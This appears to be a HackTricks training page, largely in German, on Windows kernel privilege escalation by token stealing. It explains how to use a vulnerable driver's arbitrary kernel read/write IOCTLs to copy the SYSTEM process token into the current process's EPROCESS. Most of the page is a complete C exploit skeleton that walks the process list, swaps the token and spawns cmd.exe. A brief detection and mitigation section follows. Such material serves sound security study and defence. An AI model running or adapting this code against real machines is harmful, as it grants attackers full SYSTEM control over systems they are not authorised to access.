# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Wenn ein verwundbarer Driver einen IOCTL bereitstellt, der einem Angreifer beliebige kernel read- und/oder write-Primitiven erlaubt, kann die Erhöhung auf NT AUTHORITY\SYSTEM oft erreicht werden, indem man ein SYSTEM access Token stiehlt. Die Technik kopiert den Token-Pointer aus dem EPROCESS eines SYSTEM-Prozesses in das EPROCESS des aktuellen Prozesses.

Warum das funktioniert:
- Jeder Prozess hat eine EPROCESS-Struktur, die (unter anderen Feldern) ein Token enthält (tatsächlich ein EX_FAST_REF auf ein Token-Objekt).
- Der SYSTEM-Prozess (PID 4) besitzt ein Token mit allen aktivierten Privilegien.
- Das Ersetzen von EPROCESS.Token des aktuellen Prozesses durch den SYSTEM-Token-Pointer lässt den aktuellen Prozess sofort als SYSTEM laufen.

> Offsets in EPROCESS variieren zwischen Windows-Versionen. Bestimme sie dynamisch (Symbole) oder verwende versionsspezifische Konstanten. Denk auch daran, dass EPROCESS.Token ein EX_FAST_REF ist (die unteren 3 Bits sind Flags für die Referenzzählung).

## Hauptschritte

1) Lokalisieren des ntoskrnl.exe-Base und Auflösen der Adresse von PsInitialSystemProcess.
- Aus dem User-Mode heraus: NtQuerySystemInformation(SystemModuleInformation) oder EnumDeviceDrivers verwenden, um geladene Driver-Basen zu bekommen.
- Addiere den Offset von PsInitialSystemProcess (aus Symbolen/Reversing) zur Kernel-Base, um dessen Adresse zu erhalten.
2) Lies den Pointer bei PsInitialSystemProcess → dies ist ein Kernel-Pointer auf SYSTEMs EPROCESS.
3) Vom SYSTEM-EPROCESS aus, lies UniqueProcessId und ActiveProcessLinks-Offsets, um die doppelt verkettete Liste der EPROCESS-Strukturen (ActiveProcessLinks.Flink/Blink) zu traversieren, bis du das EPROCESS findest, dessen UniqueProcessId gleich GetCurrentProcessId() ist. Merke dir beide:
- EPROCESS_SYSTEM (für SYSTEM)
- EPROCESS_SELF (für den aktuellen Prozess)
4) Lies den SYSTEM-Token-Wert: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Maskiere die unteren 3 Bits heraus: Token_SYS_masked = Token_SYS & ~0xF (üblich ~0xF oder ~0x7 je nach Build; auf x64 werden die unteren 3 Bits verwendet — 0xFFFFFFFFFFFFFFF8 Maske).
5) Option A (üblich): Bewahre die unteren 3 Bits von deinem aktuellen Token und splice sie auf den SYSTEM-Pointer, um die eingebettete Referenzzählung konsistent zu halten.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Schreibe Token_NEW zurück in (EPROCESS_SELF + TokenOffset) mit deinem kernel write-Primitive.
7) Dein aktueller Prozess läuft jetzt als SYSTEM. Optional spawn eine neue cmd.exe oder powershell.exe zur Bestätigung.

## Pseudocode

Below is a skeleton that only uses two IOCTLs from a vulnerable driver, one for 8-byte kernel read and one for 8-byte kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Hinweise:
- Offsets: Verwende WinDbg’s `dt nt!_EPROCESS` mit den Ziel‑PDBs oder einen Laufzeit-Symbol-Loader, um die korrekten Offsets zu erhalten. Nicht blind hardcoden.
- Maske: Auf x64 ist das Token ein EX_FAST_REF; die unteren 3 Bits sind reference count bits. Die ursprünglichen unteren Bits deines Tokens beizubehalten vermeidet sofortige Refcount-Inkonsistenzen.
- Stabilität: Bevorzuge die Erhöhung des aktuellen Prozesses; wenn du einen kurzlebigen Helper erhöhst, kannst du SYSTEM verlieren, wenn er beendet.

## Erkennung & Gegenmaßnahmen
- Das Laden unsignierter oder nicht vertrauenswürdiger Drittanbieter-Treiber, die mächtige IOCTLs bereitstellen, ist die Hauptursache.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard und Attack Surface Reduction-Regeln können verhindern, dass verwundbare Treiber geladen werden.
- EDR kann nach verdächtigen IOCTL-Sequenzen Ausschau halten, die arbitrary read/write implementieren, sowie nach Token-Swaps.

## Referenzen
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
